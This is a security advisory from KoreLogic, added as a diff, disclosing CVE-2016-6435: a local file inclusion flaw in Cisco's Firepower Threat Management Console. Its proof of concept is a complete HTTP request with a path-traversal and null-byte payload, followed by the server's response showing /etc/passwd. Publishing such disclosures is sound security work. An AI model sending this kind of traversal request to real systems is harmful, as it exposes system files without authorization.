@@ -1,0 +1,115 @@
+KL-001-2016-006 : Cisco Firepower Threat Management Console Local File Inclusion
+
+Title: Cisco Firepower Threat Management Console Local File Inclusion
+Advisory ID: KL-001-2016-006
+Publication Date: 2016.10.05
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2016-006.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Cisco
+     Affected Product: Firepower Threat Management Console
+     Affected Version: Cisco Fire Linux OS 6.0.1 (build 37/build 1213)
+     Platform: Embedded Linux
+     CWE Classification: CWE-73: External Control of File Name or Path
+     Impact: Information Disclosure
+     Attack vector: HTTP
+     CVE-ID: CVE-2016-6435
+
+2. Vulnerability Description
+
+     An authenticated user can access arbitrary files on the local system.
+
+3. Technical Description
+
+     Requests that take a file path do not properly filter what files can
+     be requested.  The webserver does not run as root, so files such as
+     /etc/shadow are not readable.
+
+     GET /events/reports/view.cgi?download=1&files=../../../etc/passwd%00 HTTP/1.1
+     Host: 1.3.3.7
+     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0)
+Gecko/20100101 Firefox/45.0
+     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate, br
+     DNT: 1
+     Cookie: CGISESSID=2ee7e6f19a104f4453e201f26fdbd6f3
+     Connection: close
+
+     HTTP/1.1 200 OK
+     Date: Fri, 22 Apr 2016 23:58:41 GMT
+     Server: Apache
+     Content-Disposition: attachment; filename=passwd
+     X-Frame-Options: SAMEORIGIN
+     Connection: close
+     Content-Type: application/octet-stream
+     Content-Length: 623
+
+     root:x:0:0:Operator:/root:/bin/sh
+     bin:x:1:1:bin:/bin:/sbin/nologin
+     daemon:x:2:2:daemon:/sbin:/sbin/nologin
+     mysql:x:27:27:MySQL:/var/lib/mysql:/sbin/nologin
+     nobody:x:99:99:nobody:/:/sbin/nologin
+     sshd:x:33:33:sshd:/:/sbin/nologin
+     www:x:67:67:HTTP server:/var/www:/sbin/nologin
+     sfrna:x:88:88:SF RNA User:/Volume/home/sfrna:/sbin/nologin
+     snorty:x:90:90:Snorty User:/Volume/home/snorty:/sbin/nologin
+     sfsnort:x:95:95:SF Snort User:/Volume/home/sfsnort:/sbin/nologin
+     sfremediation:x:103:103::/Volume/home/remediations:/sbin/nologin
+     admin:x:100:100::/Volume/home/admin:/bin/sh
+     casuser:x:101:104:CiscoUser:/var/opt/CSCOpx:/bin/bash
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has issued a patch for this vulnerability
+     in version 6.1. Vendor acknowledgement available at:
+
+https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc2
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     of KoreLogic, Inc.
+
+6. Disclosure Timeline
+
+     2016.06.30 - KoreLogic sends vulnerability report and PoC to Cisco.
+     2016.06.30 - Cisco acknowledges receipt of vulnerability report.
+     2016.07.20 - KoreLogic and Cisco discuss remediation timeline for
+                  this vulnerability and for 3 others reported in the
+                  same product.
+     2016.08.12 - 30 business days have elapsed since the vulnerability was
+                  reported to Cisco.
+     2016.09.02 - 45 business days have elapsed since the vulnerability was
+                  reported to Cisco.
+     2016.09.09 - KoreLogic asks for an update on the status of the
+                  remediation efforts.
+     2016.09.15 - Cisco confirms remediation is underway and soon to be
+                  completed.
+     2016.09.28 - Cisco informs KoreLogic that the remediation details will
+                  be released publicly on 2016.10.05.
+     2016.10.05 - Public disclosure.
+
+7. Proof of Concept
+
+     See Technical Description
+
+
+The contents of this advisory are copyright(c) 2016
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
